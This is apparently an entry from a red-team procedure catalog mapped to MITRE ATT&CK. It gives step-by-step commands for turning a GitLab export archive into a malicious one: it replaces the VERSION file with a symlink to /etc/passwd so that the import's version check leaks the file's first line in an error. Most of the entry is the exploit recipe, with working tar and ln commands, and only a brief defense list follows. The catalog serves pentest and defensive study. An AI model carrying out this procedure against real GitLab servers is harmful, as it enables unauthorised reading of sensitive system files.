---
tags:
  - symlink
  - arbitrary-file-read
type: procedure
tools:
  - '[[tools/GNU-Tar]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/list-directory-with-symlinks]]'
  - '[[commands/create-tar-gz-archive]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-25T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:24:08.379Z'
sub_techniques: []
id: 79c90379-2b62-40a1-ac0d-4be7f44127bf
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Modify-Export-with-Symlink-for-Partial-Read

## Summary

This procedure modifies a GitLab export archive by replacing the VERSION file with a symlink to a sensitive target file, enabling partial leakage of the first line during import validation.

## Description

The attack scenario involves extracting the legitimate export, creating a symlink from VERSION to a file like /etc/passwd, and re-archiving. During import, Gitlab::ImportExport::VersionChecker uses readline() on the symlinked file, exposing the first line in an exception if versions mismatch. Prerequisites include a legitimate export and tar tools. Outcomes: Controlled partial file disclosure.

## Requirements

1. Legitimate GitLab export tar.gz
2. Linux environment with tar and ln commands
3. Target file path known (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:

- Use secure extraction methods that resolve symlinks (e.g., --no-follow-symlinks in tar)
- Validate archive contents before processing
- Log and alert on import errors with file content exposure

## Objectives

1. Insert symlink for VERSION to leak first line
2. Prepare malicious archive for upload
3. Achieve initial file disclosure

## Instructions

### Step 1: Extract Export

**Context**: Unpack the archive to access files.

Use tar to extract: `tar -xzf export.tar.gz`

### Step 2: Create Symlink

**Context**: Replace VERSION with symlink to target.

Execute: `ln -s /etc/passwd VERSION`

### Step 3: Inspect Modifications

**Context**: Verify symlink creation.

Use [[commands/list-directory-with-symlinks]] to check:

```bash
ls -lash
```

> Expected output: Listing showing 'lrwxr-xr-x VERSION -> /etc/passwd'

### Step 4: Re-Archive

**Context**: Package the modified directory.

Use [[commands/create-tar-gz-archive]]:

```bash
tar -czvf test.tar.gz .
```

> Expected output: Verbose creation of test.tar.gz with symlinked file.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/list-directory-with-symlinks]]
- [[commands/create-tar-gz-archive]]

## Tools Used

- [[tools/GNU-Tar]]

## Tags

- [[symlink]]
- [[arbitrary-file-read]]
